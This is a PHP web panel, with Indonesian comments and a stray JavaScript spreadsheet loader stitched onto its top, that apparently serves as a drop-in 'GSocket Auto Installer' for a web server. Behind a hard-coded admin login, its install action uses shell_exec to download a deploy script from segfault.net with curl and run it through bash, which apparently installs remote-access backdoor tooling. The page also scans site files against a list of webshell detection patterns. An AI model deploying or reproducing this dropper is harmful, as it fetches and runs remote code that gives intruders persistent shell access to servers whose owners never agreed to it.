<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row =>
                    row.some(cell => cell !== '' && cell !== null && cell !== undefined)
                );

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><?php
session_start();

// Kredensial statis (ganti dengan database untuk produksi)
$valid_username = "admin";
$valid_password = "null7";

// Pola untuk mendeteksi webshell
$webshell_patterns = [
    '/\beval\s*\(/i',
    '/\bsystem\s*\(/i',
    '/\bexec\s*\(/i',
    '/\bshell_exec\s*\(/i',
    '/\bpassthru\s*\(/i',
    '/\bpopen\s*\(/i',
    '/\bproc_open\s*\(/i',
    '/\$_POST\[\'cmd\'\]/i',
    '/\$_GET\[\'cmd\'\]/i',
    '/\bbase64_decode\s*\(/i',
    '/\bgzinflate\s*\(/i',
    '/\bstr_rot13\s*\(/i',
    '/\bpreg_replace\s*\(.*?\/e/i',
];

// Fungsi untuk memindai file PHP untuk pola webshell
function scanForWebshells($directory) {
    global $webshell_patterns;
    $results = [];
    
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getExtension() === 'php') {
                $content = @file_get_contents($file->getPathname());
                if ($content === false) {
                    continue;
                }
                
                $suspicions = [];
                foreach ($webshell_patterns as $pattern) {
                    if (preg_match($pattern, $content)) {
                        $suspicions[] = "Matched pattern: $pattern";
                    }
                }
                
                if (!empty($suspicions)) {
                    $results[] = [
                        'file' => $file->getPathname(),
                        'suspicions' => implode(', ', $suspicions),
                    ];
                }
            }
        }
    } catch (Exception $e) {
        return ['error' => 'Error scanning directory: ' . $e->getMessage()];
    }
    
    return $results;
}

// Fungsi untuk menampilkan halaman login
function displayLogin($error = false) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>GSocket Installer - Login</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body {
                background: url('https://i.pinimg.com/originals/28/d9/a5/28d9a5107af5d4c4da117c05b4393b83.gif') no-repeat center center fixed;
                background-size: cover;
                font-family: 'Inter', sans-serif;
            }
            .fade-in {
                animation: fadeIn 1s ease-in-out;
            }
            @keyframes fadeIn {
                0% { opacity: 0; transform: translateY(20px); }
                100% { opacity: 1; transform: translateY(0); }
            }
            .form-container {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
            }
            .btn:hover {
                transform: scale(1.05);
                transition: transform 0.2s ease-in-out;
            }
        </style>
    </head>
    <body class="flex items-center justify-center min-h-screen">
        <div class="form-container p-8 rounded-2xl shadow-2xl w-full max-w-md fade-in">
            <h1 class="text-3xl font-bold text-center text-gray-800 mb-6">GSocket Auto Installer</h1>
            <form action="?action=login" method="POST" class="space-y-6">
                <div>
                    <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
                    <input type="text" id="username" name="username" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition">
                </div>
                <div>
                    <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
                    <input type="password" id="password" name="password" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition">
                </div>
                <button type="submit" class="btn w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition shadow-lg">Login</button>
            </form>
            <?php if ($error): ?>
                <p class="mt-4 text-red-500 text-center font-medium">Invalid username or password.</p>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
}

// Fungsi untuk menampilkan halaman dashboard
function displayDashboard() {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>GSocket Installer - Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body {
                background: #ffffff;
                font-family: 'Inter', sans-serif;
            }
            .fade-in {
                animation: fadeIn 1s ease-in-out;
            }
            @keyframes fadeIn {
                0% { opacity: 0; transform: translateY(20px); }
                100% { opacity: 1; transform: translateY(0); }
            }
            .card {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
                transition: transform 0.3s ease;
            }
            .card:hover {
                transform: translateY(-5px);
            }
            .btn:hover {
                transform: scale(1.05);
                transition: transform 0.2s ease-in-out;
            }
            .pulse {
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.1); }
                100% { transform: scale(1); }
            }
            .spinner {
                display: none;
                border: 4px solid rgba(0, 0, 0, 0.1);
                border-left-color: #22c55e;
                border-radius: 50%;
                width: 24px;
                height: 24px;
                animation: spin 1s linear infinite;
                margin-left: 10px;
            }
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th, td {
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid #e5e7eb;
            }
            th {
                background: #f3f4f6;
                font-weight: 600;
            }
            tr {
                background: #f0fdf4;
            }
            td {
                color: #15803d;
            }
        </style>
        <script>
            function startInstallation(button) {
                button.innerHTML = 'Installing... <span class="spinner inline-block"></span>';
                button.classList.add('opacity-75', 'cursor-not-allowed');
                document.querySelector('.spinner').style.display = 'inline-block';
                const audio = document.getElementById('hackerSoundInstall');
                audio.play();
                setTimeout(() => {
                    audio.pause();
                    audio.currentTime = 0;
                }, 5000);
            }

            function startScan(button) {
                button.innerHTML = 'Scanning... <span class="spinner inline-block"></span>';
                button.classList.add('opacity-75', 'cursor-not-allowed');
                document.querySelectorAll('.spinner')[1].style.display = 'inline-block';
                const audio = document.getElementById('hackerSoundScan');
                audio.play();
                setTimeout(() => {
                    audio.pause();
                    audio.currentTime = 0;
                }, 5000);
            }
        </script>
    </head>
    <body class="min-h-screen text-gray-800">
        <nav class="bg-blue-800 p-4 sticky top-0 shadow-lg">
            <div class="container mx-auto flex justify-between items-center">
                <h1 class="text-white text-xl font-bold">GSocket Auto Installer</h1>
                <a href="?action=logout" class="text-white hover:text-blue-200 transition font-medium">Logout</a>
            </div>
        </nav>
        <div class="container mx-auto p-6">
            <div class="card rounded-2xl shadow-2xl p-8 fade-in">
                <h2 class="text-2xl font-semibold mb-4 text-gray-800">GSocket Installation</h2>
                <p class="text-gray-600 mb-6">Click the button below to start the GSocket installation process.</p>
                <form action="?action=install" method="POST" class="mb-8">
                    <button type="submit" name="install" class="btn bg-green-500 text-white px-6 py-3 rounded-lg hover:bg-green-600 transition shadow-lg pulse" onclick="startInstallation(this)">Start Installation</button>
                </form>
                <h2 class="text-2xl font-semibold mb-4 text-gray-800">Webshell Scanner</h2>
                <p class="text-gray-600 mb-6">Scan the website directory for potential PHP webshells.</p>
                <form action="?action=scan" method="POST">
                    <button type="submit" name="scan" class="btn bg-purple-500 text-white px-6 py-3 rounded-lg hover:bg-purple-600 transition shadow-lg pulse" onclick="startScan(this)">Scan for Webshells</button>
                </form>
                <!-- Elemen audio untuk efek suara -->
                <audio id="hackerSoundInstall" src="https://www.freesound.org/data/previews/171/171104_3049496-lq.mp3"></audio>
                <audio id="hackerSoundScan" src="https://www.freesound.org/data/previews/120/120341_1849770-lq.mp3"></audio>
                <?php if (isset($_SESSION['install_output'])): ?>
                    <div class="mt-6 p-4 bg-gray-100 rounded-lg">
                        <h3 class="font-semibold text-gray-800">Installation Output:</h3>
                        <pre class="text-sm text-gray-700"><?php echo htmlspecialchars($_SESSION['install_output']); ?></pre>
                    </div>
                <?php endif; ?>
                <?php if (isset($_SESSION['scan_results'])): ?>
                    <div class="mt-6 p-4 bg-gray-100 rounded-lg">
                        <h3 class="font-semibold text-gray-800">Webshell Scan Results:</h3>
                        <?php if (isset($_SESSION['scan_results']['error'])): ?>
                            <p class="text-red-500"><?php echo htmlspecialchars($_SESSION['scan_results']['error']); ?></p>
                        <?php elseif (empty($_SESSION['scan_results'])): ?>
                            <p class="text-green-500 font-medium">No suspicious PHP files detected.</p>
                        <?php else: ?>
                            <table>
                                <thead>
                                    <tr>
                                        <th>File Path</th>
                                        <th>Suspected Issues</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($_SESSION['scan_results'] as $result): ?>
                                        <tr>
                                            <td><?php echo htmlspecialchars($result['file']); ?></td>
                                            <td><?php echo htmlspecialchars($result['suspicions']); ?></td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        <?php endif; ?>
                    </div>
                    <?php unset($_SESSION['scan_results']); ?>
                <?php endif; ?>
            </div>
        </div>
    </body>
    </html>
    <?php
}

// Logika utama berdasarkan aksi
$action = isset($_GET['action']) ? $_GET['action'] : '';

if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['loggedin'] = true;
        header("Location: ?action=dashboard");
        exit;
    } else {
        displayLogin(true);
        exit;
    }
} elseif ($action === 'dashboard') {
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        displayLogin();
        exit;
    }
    displayDashboard();
    exit;
} elseif ($action === 'install' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        displayLogin();
        exit;
    }
    if (isset($_POST['install'])) {
        // Perintah instalasi GSocket berdasarkan dokumentasi
        $install_command = "curl -fsSL http://nossl.segfault.net/deploy-all.sh -o deploy-all.sh && bash deploy-all.sh 2>&1";
        $output = shell_exec($install_command);
        $_SESSION['install_output'] = $output ? $output : "Installation completed, but no output was captured.";
    }
    header("Location: ?action=dashboard");
    exit;
} elseif ($action === 'scan' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        displayLogin();
        exit;
    }
    if (isset($_POST['scan'])) {
        // Memindai direktori saat ini (website root)
        $directory = __DIR__;
        $_SESSION['scan_results'] = scanForWebshells($directory);
    }
    header("Location: ?action=dashboard");
    exit;
} elseif ($action === 'logout') {
    session_destroy();
    header("Location: ?");
    exit;
} else {
    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
        displayDashboard();
    } else {
        displayLogin();
    }
}
?>